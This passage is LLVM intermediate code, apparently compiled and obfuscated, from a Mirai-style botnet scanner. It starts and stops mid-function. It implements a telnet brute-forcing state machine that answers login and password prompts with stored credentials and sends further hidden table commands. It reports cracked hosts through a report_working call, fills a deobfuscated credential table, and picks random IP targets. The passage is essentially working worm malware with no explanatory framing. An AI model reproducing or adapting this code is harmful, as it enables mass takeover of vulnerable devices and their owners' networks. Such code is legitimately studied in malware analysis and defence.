  %787 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %788 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %787, i32 0, i32 7
  %789 = getelementptr inbounds [256 x i8], [256 x i8]* %788, i32 0, i32 0
  %790 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %791 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %790, i32 0, i32 6
  %792 = load i32, i32* %791, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds i8, i8* %789, i64 %793
  %795 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %796 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %795, i32 0, i32 6
  %797 = load i32, i32* %796, align 4
  %798 = sub i32 0, %797
  %799 = add i32 256, %798
  %800 = sub nsw i32 256, %797
  %801 = call i32 @recv_strip_null(i32 %786, i8* %794, i32 %799, i32 16384)
  store i32 %801, i32* %32, align 4
  %802 = load i32, i32* %32, align 4
  %803 = icmp eq i32 %802, 0
  br i1 %803, label %804, label %806

; <label>:804:                                    ; preds = %782
  %805 = call i32* @__errno_location() #7
  store i32 104, i32* %805, align 4
  store i32 -1, i32* %32, align 4
  br label %806

; <label>:806:                                    ; preds = %804, %782
  %807 = load i32, i32* %32, align 4
  %808 = icmp eq i32 %807, -1
  br i1 %808, label %809, label %842

; <label>:809:                                    ; preds = %806
  %810 = call i32* @__errno_location() #7
  %811 = load i32, i32* %810, align 4
  %812 = icmp ne i32 %811, 11
  br i1 %812, label %813, label %841

; <label>:813:                                    ; preds = %809
  %814 = call i32* @__errno_location() #7
  %815 = load i32, i32* %814, align 4
  %816 = icmp ne i32 %815, 11
  br i1 %816, label %817, label %841

; <label>:817:                                    ; preds = %813
  %818 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %819 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %818, i32 0, i32 1
  %820 = load i32, i32* %819, align 8
  %821 = call i32 @close(i32 %820)
  %822 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %823 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %822, i32 0, i32 1
  store i32 -1, i32* %823, align 8
  %824 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %825 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %824, i32 0, i32 8
  %826 = load i8, i8* %825, align 8
  %827 = add i8 %826, 107
  %828 = add i8 %827, 1
  %829 = sub i8 %828, 107
  %830 = add i8 %826, 1
  store i8 %829, i8* %825, align 8
  %831 = zext i8 %829 to i32
  %832 = icmp sge i32 %831, 10
  br i1 %832, label %833, label %838

; <label>:833:                                    ; preds = %817
  %834 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %835 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %834, i32 0, i32 8
  store i8 0, i8* %835, align 8
  %836 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %837 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %836, i32 0, i32 3
  store i32 0, i32* %837, align 8
  br label %840

; <label>:838:                                    ; preds = %817
  %839 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %839)
  br label %840

; <label>:840:                                    ; preds = %838, %833
  br label %841

; <label>:841:                                    ; preds = %840, %813, %809
  br label %1110

; <label>:842:                                    ; preds = %806
  %843 = load i32, i32* %32, align 4
  %844 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %845 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %844, i32 0, i32 6
  %846 = load i32, i32* %845, align 4
  %847 = add i32 %846, -1680277492
  %848 = add i32 %847, %843
  %849 = sub i32 %848, -1680277492
  %850 = add nsw i32 %846, %843
  store i32 %849, i32* %845, align 4
  %851 = load i32, i32* @fake_time, align 4
  %852 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %853 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %852, i32 0, i32 2
  store i32 %851, i32* %853, align 4
  br label %854

; <label>:854:                                    ; preds = %1108, %842
  store i32 0, i32* %33, align 4
  %855 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %855, i32 0, i32 3
  %857 = load i32, i32* %856, align 8
  switch i32 %857, label %1071 [
    i32 2, label %858
    i32 3, label %866
    i32 4, label %893
    i32 5, label %920
    i32 6, label %940
    i32 7, label %960
    i32 8, label %980
    i32 9, label %1000
    i32 10, label %1020
  ]

; <label>:858:                                    ; preds = %854
  %859 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %860 = call i32 @consume_iacs(%struct.scanner_connection* %859)
  store i32 %860, i32* %33, align 4
  %861 = icmp sgt i32 %860, 0
  br i1 %861, label %862, label %865

; <label>:862:                                    ; preds = %858
  %863 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %864 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %863, i32 0, i32 3
  store i32 3, i32* %864, align 8
  br label %865

; <label>:865:                                    ; preds = %862, %858
  br label %1072

; <label>:866:                                    ; preds = %854
  %867 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %868 = call i32 @consume_user_prompt(%struct.scanner_connection* %867)
  store i32 %868, i32* %33, align 4
  %869 = icmp sgt i32 %868, 0
  br i1 %869, label %870, label %892

; <label>:870:                                    ; preds = %866
  %871 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %872 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %871, i32 0, i32 1
  %873 = load i32, i32* %872, align 8
  %874 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %875 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %874, i32 0, i32 0
  %876 = load %struct.scanner_auth*, %struct.scanner_auth** %875, align 8
  %877 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %876, i32 0, i32 0
  %878 = load i8*, i8** %877, align 8
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %879, i32 0, i32 0
  %881 = load %struct.scanner_auth*, %struct.scanner_auth** %880, align 8
  %882 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %881, i32 0, i32 4
  %883 = load i8, i8* %882, align 4
  %884 = zext i8 %883 to i64
  %885 = call i64 @send(i32 %873, i8* %878, i64 %884, i32 16384)
  %886 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %887 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %886, i32 0, i32 1
  %888 = load i32, i32* %887, align 8
  %889 = call i64 @send(i32 %888, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %890 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %891 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %890, i32 0, i32 3
  store i32 4, i32* %891, align 8
  br label %892

; <label>:892:                                    ; preds = %870, %866
  br label %1072

; <label>:893:                                    ; preds = %854
  %894 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %895 = call i32 @consume_pass_prompt(%struct.scanner_connection* %894)
  store i32 %895, i32* %33, align 4
  %896 = icmp sgt i32 %895, 0
  br i1 %896, label %897, label %919

; <label>:897:                                    ; preds = %893
  %898 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %899 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %898, i32 0, i32 1
  %900 = load i32, i32* %899, align 8
  %901 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %902 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %901, i32 0, i32 0
  %903 = load %struct.scanner_auth*, %struct.scanner_auth** %902, align 8
  %904 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %903, i32 0, i32 1
  %905 = load i8*, i8** %904, align 8
  %906 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %907 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %906, i32 0, i32 0
  %908 = load %struct.scanner_auth*, %struct.scanner_auth** %907, align 8
  %909 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %908, i32 0, i32 5
  %910 = load i8, i8* %909, align 1
  %911 = zext i8 %910 to i64
  %912 = call i64 @send(i32 %900, i8* %905, i64 %911, i32 16384)
  %913 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %914 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %913, i32 0, i32 1
  %915 = load i32, i32* %914, align 8
  %916 = call i64 @send(i32 %915, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %917 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %918 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %917, i32 0, i32 3
  store i32 5, i32* %918, align 8
  br label %919

; <label>:919:                                    ; preds = %897, %893
  br label %1072

; <label>:920:                                    ; preds = %854
  %921 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %922 = call i32 @consume_any_prompt(%struct.scanner_connection* %921)
  store i32 %922, i32* %33, align 4
  %923 = icmp sgt i32 %922, 0
  br i1 %923, label %924, label %939

; <label>:924:                                    ; preds = %920
  call void @table_unlock_val(i8 zeroext 5)
  %925 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %925, i8** %34, align 8
  %926 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %927 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %926, i32 0, i32 1
  %928 = load i32, i32* %927, align 8
  %929 = load i8*, i8** %34, align 8
  %930 = load i32, i32* %35, align 4
  %931 = sext i32 %930 to i64
  %932 = call i64 @send(i32 %928, i8* %929, i64 %931, i32 16384)
  %933 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %934 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %933, i32 0, i32 1
  %935 = load i32, i32* %934, align 8
  %936 = call i64 @send(i32 %935, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %937 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %938 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %937, i32 0, i32 3
  store i32 6, i32* %938, align 8
  br label %939

; <label>:939:                                    ; preds = %924, %920
  br label %1072

; <label>:940:                                    ; preds = %854
  %941 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %942 = call i32 @consume_any_prompt(%struct.scanner_connection* %941)
  store i32 %942, i32* %33, align 4
  %943 = icmp sgt i32 %942, 0
  br i1 %943, label %944, label %959

; <label>:944:                                    ; preds = %940
  call void @table_unlock_val(i8 zeroext 6)
  %945 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %945, i8** %36, align 8
  %946 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %947 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %946, i32 0, i32 1
  %948 = load i32, i32* %947, align 8
  %949 = load i8*, i8** %36, align 8
  %950 = load i32, i32* %37, align 4
  %951 = sext i32 %950 to i64
  %952 = call i64 @send(i32 %948, i8* %949, i64 %951, i32 16384)
  %953 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %954 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %953, i32 0, i32 1
  %955 = load i32, i32* %954, align 8
  %956 = call i64 @send(i32 %955, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %957 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %958 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %957, i32 0, i32 3
  store i32 7, i32* %958, align 8
  br label %959

; <label>:959:                                    ; preds = %944, %940
  br label %1072

; <label>:960:                                    ; preds = %854
  %961 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %962 = call i32 @consume_any_prompt(%struct.scanner_connection* %961)
  store i32 %962, i32* %33, align 4
  %963 = icmp sgt i32 %962, 0
  br i1 %963, label %964, label %979

; <label>:964:                                    ; preds = %960
  call void @table_unlock_val(i8 zeroext 4)
  %965 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %965, i8** %38, align 8
  %966 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %967 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %966, i32 0, i32 1
  %968 = load i32, i32* %967, align 8
  %969 = load i8*, i8** %38, align 8
  %970 = load i32, i32* %39, align 4
  %971 = sext i32 %970 to i64
  %972 = call i64 @send(i32 %968, i8* %969, i64 %971, i32 16384)
  %973 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %974 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %973, i32 0, i32 1
  %975 = load i32, i32* %974, align 8
  %976 = call i64 @send(i32 %975, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %977 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %978 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %977, i32 0, i32 3
  store i32 8, i32* %978, align 8
  br label %979

; <label>:979:                                    ; preds = %964, %960
  br label %1072

; <label>:980:                                    ; preds = %854
  %981 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %982 = call i32 @consume_any_prompt(%struct.scanner_connection* %981)
  store i32 %982, i32* %33, align 4
  %983 = icmp sgt i32 %982, 0
  br i1 %983, label %984, label %999

; <label>:984:                                    ; preds = %980
  call void @table_unlock_val(i8 zeroext 7)
  %985 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %985, i8** %40, align 8
  %986 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %987 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %986, i32 0, i32 1
  %988 = load i32, i32* %987, align 8
  %989 = load i8*, i8** %40, align 8
  %990 = load i32, i32* %41, align 4
  %991 = sext i32 %990 to i64
  %992 = call i64 @send(i32 %988, i8* %989, i64 %991, i32 16384)
  %993 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %994 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %993, i32 0, i32 1
  %995 = load i32, i32* %994, align 8
  %996 = call i64 @send(i32 %995, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %997 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %998 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %997, i32 0, i32 3
  store i32 9, i32* %998, align 8
  br label %999

; <label>:999:                                    ; preds = %984, %980
  br label %1072

; <label>:1000:                                   ; preds = %854
  %1001 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1002 = call i32 @consume_any_prompt(%struct.scanner_connection* %1001)
  store i32 %1002, i32* %33, align 4
  %1003 = icmp sgt i32 %1002, 0
  br i1 %1003, label %1004, label %1019

; <label>:1004:                                   ; preds = %1000
  call void @table_unlock_val(i8 zeroext 8)
  %1005 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1005, i8** %42, align 8
  %1006 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1007 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1006, i32 0, i32 1
  %1008 = load i32, i32* %1007, align 8
  %1009 = load i8*, i8** %42, align 8
  %1010 = load i32, i32* %43, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = call i64 @send(i32 %1008, i8* %1009, i64 %1011, i32 16384)
  %1013 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1014 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1013, i32 0, i32 1
  %1015 = load i32, i32* %1014, align 8
  %1016 = call i64 @send(i32 %1015, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1017 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1018 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1017, i32 0, i32 3
  store i32 10, i32* %1018, align 8
  br label %1019

; <label>:1019:                                   ; preds = %1004, %1000
  br label %1072

; <label>:1020:                                   ; preds = %854
  %1021 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1022 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1021)
  store i32 %1022, i32* %33, align 4
  %1023 = load i32, i32* %33, align 4
  %1024 = icmp eq i32 %1023, -1
  br i1 %1024, label %1025, label %1048

; <label>:1025:                                   ; preds = %1020
  %1026 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1027 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1026, i32 0, i32 1
  %1028 = load i32, i32* %1027, align 8
  %1029 = call i32 @close(i32 %1028)
  %1030 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1031 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1030, i32 0, i32 1
  store i32 -1, i32* %1031, align 8
  %1032 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1033 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1032, i32 0, i32 8
  %1034 = load i8, i8* %1033, align 8
  %1035 = sub i8 0, 1
  %1036 = sub i8 %1034, %1035
  %1037 = add i8 %1034, 1
  store i8 %1036, i8* %1033, align 8
  %1038 = zext i8 %1036 to i32
  %1039 = icmp eq i32 %1038, 10
  br i1 %1039, label %1040, label %1045

; <label>:1040:                                   ; preds = %1025
  %1041 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1042 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1041, i32 0, i32 8
  store i8 0, i8* %1042, align 8
  %1043 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1044 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1043, i32 0, i32 3
  store i32 0, i32* %1044, align 8
  br label %1047

; <label>:1045:                                   ; preds = %1025
  %1046 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1046)
  br label %1047

; <label>:1047:                                   ; preds = %1045, %1040
  br label %1070

; <label>:1048:                                   ; preds = %1020
  %1049 = load i32, i32* %33, align 4
  %1050 = icmp sgt i32 %1049, 0
  br i1 %1050, label %1051, label %1069

; <label>:1051:                                   ; preds = %1048
  %1052 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1053 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1052, i32 0, i32 4
  %1054 = load i32, i32* %1053, align 4
  %1055 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1056 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1055, i32 0, i32 5
  %1057 = load i16, i16* %1056, align 8
  %1058 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1059 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1058, i32 0, i32 0
  %1060 = load %struct.scanner_auth*, %struct.scanner_auth** %1059, align 8
  call void @report_working(i32 %1054, i16 zeroext %1057, %struct.scanner_auth* %1060)
  %1061 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1062 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1061, i32 0, i32 1
  %1063 = load i32, i32* %1062, align 8
  %1064 = call i32 @close(i32 %1063)
  %1065 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1066 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1065, i32 0, i32 1
  store i32 -1, i32* %1066, align 8
  %1067 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1068 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1067, i32 0, i32 3
  store i32 0, i32* %1068, align 8
  br label %1069

; <label>:1069:                                   ; preds = %1051, %1048
  br label %1070

; <label>:1070:                                   ; preds = %1069, %1047
  br label %1072

; <label>:1071:                                   ; preds = %854
  store i32 0, i32* %33, align 4
  br label %1072

; <label>:1072:                                   ; preds = %1071, %1070, %1019, %999, %979, %959, %939, %919, %892, %865
  %1073 = load i32, i32* %33, align 4
  %1074 = icmp eq i32 %1073, 0
  br i1 %1074, label %1075, label %1076

; <label>:1075:                                   ; preds = %1072
  br label %1109

; <label>:1076:                                   ; preds = %1072
  %1077 = load i32, i32* %33, align 4
  %1078 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1079 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1078, i32 0, i32 6
  %1080 = load i32, i32* %1079, align 4
  %1081 = icmp sgt i32 %1077, %1080
  br i1 %1081, label %1082, label %1086

; <label>:1082:                                   ; preds = %1076
  %1083 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1084 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1083, i32 0, i32 6
  %1085 = load i32, i32* %1084, align 4
  store i32 %1085, i32* %33, align 4
  br label %1086

; <label>:1086:                                   ; preds = %1082, %1076
  %1087 = load i32, i32* %33, align 4
  %1088 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1089 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1088, i32 0, i32 6
  %1090 = load i32, i32* %1089, align 4
  %1091 = add i32 %1090, 1447030653
  %1092 = sub i32 %1091, %1087
  %1093 = sub i32 %1092, 1447030653
  %1094 = sub nsw i32 %1090, %1087
  store i32 %1093, i32* %1089, align 4
  %1095 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1096 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1095, i32 0, i32 7
  %1097 = getelementptr inbounds [256 x i8], [256 x i8]* %1096, i32 0, i32 0
  %1098 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1099 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1098, i32 0, i32 7
  %1100 = getelementptr inbounds [256 x i8], [256 x i8]* %1099, i32 0, i32 0
  %1101 = load i32, i32* %33, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds i8, i8* %1100, i64 %1102
  %1104 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1104, i32 0, i32 6
  %1106 = load i32, i32* %1105, align 4
  %1107 = sext i32 %1106 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1097, i8* %1103, i64 %1107, i32 1, i1 false)
  br label %1108

; <label>:1108:                                   ; preds = %1086
  br label %854

; <label>:1109:                                   ; preds = %1075
  br label %756

; <label>:1110:                                   ; preds = %841, %761
  br label %1111

; <label>:1111:                                   ; preds = %1110, %731
  br label %1112

; <label>:1112:                                   ; preds = %1111, %719, %675
  %1113 = load i32, i32* %1, align 4
  %1114 = add i32 %1113, 506071870
  %1115 = add i32 %1114, 1
  %1116 = sub i32 %1115, 506071870
  %1117 = add nsw i32 %1113, 1
  store i32 %1116, i32* %1, align 4
  br label %663

; <label>:1118:                                   ; preds = %663
  br label %198
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = sub i32 %10, 904027598
  %12 = add i32 %11, 1
  %13 = add i32 %12, 904027598
  %14 = add nsw i32 %10, 1
  %15 = sext i32 %13 to i64
  %16 = mul i64 %15, 24
  %17 = call i8* @realloc(i8* %9, i64 %16) #6
  %18 = bitcast i8* %17 to %struct.scanner_auth*
  store %struct.scanner_auth* %18, %struct.scanner_auth** @auth_table, align 8
  %19 = load i8*, i8** %4, align 8
  %20 = call i8* @deobf(i8* %19, i32* %7)
  %21 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %22 = load i32, i32* @auth_table_len, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23
  %25 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %24, i32 0, i32 0
  store i8* %20, i8** %25, align 8
  %26 = load i32, i32* %7, align 4
  %27 = trunc i32 %26 to i8
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* @auth_table_len, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 4
  store i8 %27, i8* %32, align 4
  %33 = load i8*, i8** %5, align 8
  %34 = call i8* @deobf(i8* %33, i32* %7)
  %35 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %36 = load i32, i32* @auth_table_len, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i64 %37
  %39 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %38, i32 0, i32 1
  store i8* %34, i8** %39, align 8
  %40 = load i32, i32* %7, align 4
  %41 = trunc i32 %40 to i8
  %42 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %43 = load i32, i32* @auth_table_len, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i64 %44
  %46 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i32 0, i32 5
  store i8 %41, i8* %46, align 1
  %47 = load i16, i16* @auth_table_max_weight, align 2
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %49 = load i32, i32* @auth_table_len, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i64 %50
  %52 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %51, i32 0, i32 2
  store i16 %47, i16* %52, align 8
  %53 = load i16, i16* @auth_table_max_weight, align 2
  %54 = zext i16 %53 to i32
  %55 = load i16, i16* %6, align 2
  %56 = zext i16 %55 to i32
  %57 = sub i32 %54, -525507948
  %58 = add i32 %57, %56
  %59 = add i32 %58, -525507948
  %60 = add nsw i32 %54, %56
  %61 = trunc i32 %59 to i16
  %62 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %63 = load i32, i32* @auth_table_len, align 4
  %64 = sub i32 0, 1
  %65 = sub i32 %63, %64
  %66 = add nsw i32 %63, 1
  store i32 %65, i32* @auth_table_len, align 4
  %67 = sext i32 %63 to i64
  %68 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %62, i64 %67
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %68, i32 0, i32 3
  store i16 %61, i16* %69, align 2
  %70 = load i16, i16* %6, align 2
  %71 = zext i16 %70 to i32
  %72 = load i16, i16* @auth_table_max_weight, align 2
  %73 = zext i16 %72 to i32
  %74 = sub i32 0, %73
  %75 = sub i32 0, %71
  %76 = add i32 %74, %75
  %77 = sub i32 0, %76
  %78 = add nsw i32 %73, %71
  %79 = trunc i32 %77 to i16
  store i16 %79, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

; <label>:6:                                      ; preds = %237, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = xor i32 255, -1
  %10 = xor i32 %8, %9
  %11 = and i32 %10, %8
  %12 = and i32 %8, 255
  %13 = trunc i32 %11 to i8
  store i8 %13, i8* %2, align 1
  %14 = load i32, i32* %1, align 4
  %15 = lshr i32 %14, 8
  %16 = xor i32 255, -1
  %17 = xor i32 %15, %16
  %18 = and i32 %17, %15
  %19 = and i32 %15, 255
  %20 = trunc i32 %18 to i8
  store i8 %20, i8* %3, align 1
  %21 = load i32, i32* %1, align 4
  %22 = lshr i32 %21, 16
  %23 = xor i32 255, -1
  %24 = xor i32 %22, %23
  %25 = and i32 %24, %22
  %26 = and i32 %22, 255
  %27 = trunc i32 %25 to i8
  store i8 %27, i8* %4, align 1
  %28 = load i32, i32* %1, align 4
  %29 = lshr i32 %28, 24
  %30 = xor i32 255, -1
  %31 = xor i32 %29, %30
